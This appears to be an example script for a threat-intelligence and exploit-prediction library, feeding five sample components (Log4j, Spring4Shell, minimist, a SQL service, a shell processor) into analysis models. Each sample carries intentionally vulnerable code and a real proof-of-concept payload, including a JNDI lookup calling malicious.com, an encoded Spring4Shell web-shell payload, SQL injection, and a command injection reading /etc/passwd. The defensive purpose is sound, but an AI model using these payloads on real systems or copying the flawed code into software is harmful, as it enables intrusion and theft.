"""
Example usage of SBOMAI Engine's threat intelligence capabilities.
"""

import json
from datetime import datetime
from pprint import pprint

from sbomai_ai.models.threat_intelligence import ThreatContextEmbedding
from sbomai_ai.models.threat_patterns import ExploitPatternDetector, VulnerabilityCorrelation
from sbomai_ai.models.exploit_prediction import ExploitPredictor

# Initialize models
threat_analyzer = ThreatContextEmbedding()
pattern_detector = ExploitPatternDetector()
vuln_correlator = VulnerabilityCorrelation()
exploit_predictor = ExploitPredictor()

def analyze_component(component_data):
    """Analyze a component using all available models"""
    print("\n=== Analyzing Component ===")
    print(f"Component: {component_data['name']} {component_data['version']}")
    
    # Get threat context
    threat_context = threat_analyzer.embed_component(component_data)
    print("\nThreat Context Analysis:")
    pprint(threat_context)
    
    # Detect patterns
    patterns = pattern_detector.analyze_component(component_data)
    print("\nPattern Detection Results:")
    pprint(patterns)
    
    # Predict exploit likelihood
    if 'vulnerability_data' in component_data:
        exploit_pred = exploit_predictor.predict_exploit_likelihood(
            component_data['vulnerability_data']
        )
        print("\nExploit Prediction Results:")
        pprint(exploit_pred)

def analyze_vulnerabilities(vulnerability_data):
    """Analyze correlations between vulnerabilities"""
    print("\n=== Analyzing Vulnerability Correlations ===")
    
    correlations = vuln_correlator.analyze_correlations(vulnerability_data)
    print("\nCorrelation Analysis Results:")
    pprint(correlations)

# Example 1: Log4j vulnerability
log4j_component = {
    'name': 'org.apache.logging.log4j:log4j-core',
    'version': '2.14.1',
    'description': 'Apache Log4j 2 is a versatile logging framework for Java',
    'source_code': '''
    public class Log4jExample {
        static Logger logger = LogManager.getLogger(Log4jExample.class);
        
        public void processRequest(String input) {
            logger.info("Received input: {}", input);  // Potential JNDI injection
            try {
                Context ctx = new InitialContext();
                ctx.lookup(input);  // Vulnerable JNDI lookup
            } catch (Exception e) {
                logger.error("Error processing request", e);
            }
        }
    }
    ''',
    'metadata': {
        'ecosystem': 'maven',
        'latest_version': '2.17.0',
        'usage_count': 123456,
        'stars': 4500
    },
    'vulnerability_data': {
        'cve_id': 'CVE-2021-44228',
        'cvss_score': 10.0,
        'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
        'description': 'Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.',
        'attack_vector': 'remote',
        'requires_authentication': False,
        'has_proof_of_concept': True,
        'has_known_exploit': True,
        'affects_latest_version': False,
        'proof_of_concept': '${jndi:ldap://malicious.com/exploit}'
    }
}

# Example 2: Spring4Shell vulnerability
spring_component = {
    'name': 'org.springframework:spring-core',
    'version': '5.3.17',
    'description': 'Spring Framework core module',
    'source_code': '''
    @RequestMapping("/users")
    public class UserController {
        @PostMapping
        public String createUser(@ModelAttribute User user) {
            // Vulnerable to class property manipulation
            return userService.createUser(user);
        }
    }
    ''',
    'metadata': {
        'ecosystem': 'maven',
        'latest_version': '5.3.18',
        'usage_count': 234567,
        'stars': 5600
    },
    'vulnerability_data': {
        'cve_id': 'CVE-2022-22965',
        'cvss_score': 9.8,
        'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        'description': 'A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.',
        'attack_vector': 'remote',
        'requires_authentication': False,
        'has_proof_of_concept': True,
        'has_known_exploit': True,
        'affects_latest_version': False,
        'proof_of_concept': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di'
    }
}

# Example 3: Prototype Pollution in minimist
minimist_component = {
    'name': 'minimist',
    'version': '1.2.5',
    'description': 'Parse argument options in Node.js',
    'source_code': '''
    function parseLong (obj, opts) {
        var flags = { bools : {}, strings : {}, unknownFn: null };

        if (typeof opts['unknown'] === 'function') {
            flags.unknownFn = opts['unknown'];
        }

        if (typeof opts['boolean'] === 'boolean' && opts['boolean']) {
            flags.allBools = true;
        } else {
            [].concat(opts['boolean']).filter(Boolean).forEach(function (key) {
                flags.bools[key] = true;
            });
        }
        
        Object.keys(opts.alias || {}).forEach(function (key) {
            flags.bools[key] = true;  // Vulnerable to prototype pollution
        });
    }
    ''',
    'metadata': {
        'ecosystem': 'npm',
        'latest_version': '1.2.6',
        'usage_count': 987654,
        'stars': 1200
    },
    'vulnerability_data': {
        'cve_id': 'CVE-2021-44906',
        'cvss_score': 7.5,
        'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N',
        'description': 'Prototype pollution vulnerability in minimist before 1.2.6 allows attackers to modify object properties via malicious payload.',
        'attack_vector': 'package',
        'requires_authentication': False,
        'has_proof_of_concept': True,
        'has_known_exploit': True,
        'affects_latest_version': False,
        'proof_of_concept': '{"__proto__": {"polluted": true}}'
    }
}

# Example 4: SQL Injection in a custom component
custom_component = {
    'name': 'com.example:user-service',
    'version': '1.0.0',
    'description': 'Custom user management service',
    'source_code': '''
    @Service
    public class UserService {
        @Autowired
        private JdbcTemplate jdbc;
        
        public User findUser(String username) {
            // Vulnerable to SQL injection
            String sql = "SELECT * FROM users WHERE username = '" + username + "'";
            return jdbc.queryForObject(sql, User.class);
        }
        
        public void updateUser(String username, String data) {
            // Multiple vulnerabilities:
            // 1. SQL Injection
            // 2. No input validation
            // 3. Direct object reference
            String sql = "UPDATE users SET data = '" + data + "' WHERE username = '" + username + "'";
            jdbc.update(sql);
        }
    }
    ''',
    'metadata': {
        'ecosystem': 'maven',
        'latest_version': '1.0.0',
        'usage_count': 10,
        'stars': 0
    },
    'vulnerability_data': {
        'cvss_score': 8.5,
        'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
        'description': 'SQL injection vulnerability in user management service allows attackers to execute arbitrary SQL commands.',
        'attack_vector': 'remote',
        'requires_authentication': True,
        'has_proof_of_concept': False,
        'has_known_exploit': False,
        'affects_latest_version': True,
        'proof_of_concept': "' OR '1'='1"
    }
}

# Example 5: Command Injection in shell script processor
shell_component = {
    'name': 'com.example:shell-processor',
    'version': '2.1.0',
    'description': 'Process and execute shell commands',
    'source_code': '''
    public class ShellProcessor {
        public String executeCommand(String command) {
            try {
                // Vulnerable to command injection
                Process p = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream())
                );
                return reader.lines().collect(Collectors.joining("\\n"));
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
        
        public void processScript(String script, String args) {
            // Multiple vulnerabilities:
            // 1. Command injection
            // 2. Unsanitized input
            // 3. No validation
            String cmd = script + " " + args;
            executeCommand(cmd);
        }
    }
    ''',
    'metadata': {
        'ecosystem': 'maven',
        'latest_version': '2.1.0',
        'usage_count': 50,
        'stars': 12
    },
    'vulnerability_data': {
        'cvss_score': 9.0,
        'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H',
        'description': 'Command injection vulnerability in shell command processor allows attackers to execute arbitrary system commands.',
        'attack_vector': 'local',
        'requires_authentication': True,
        'has_proof_of_concept': True,
        'has_known_exploit': False,
        'affects_latest_version': True,
        'proof_of_concept': '; cat /etc/passwd #'
    }
}

def main():
    """Run analysis on all example components"""
    # Analyze individual components
    components = [
        log4j_component,
        spring_component,
        minimist_component,
        custom_component,
        shell_component
    ]
    
    for component in components:
        analyze_component(component)
    
    # Analyze vulnerability correlations
    vulnerability_data = [
        comp['vulnerability_data'] for comp in components
        if 'vulnerability_data' in comp
    ]
    analyze_vulnerabilities(vulnerability_data)

if __name__ == '__main__':
    main()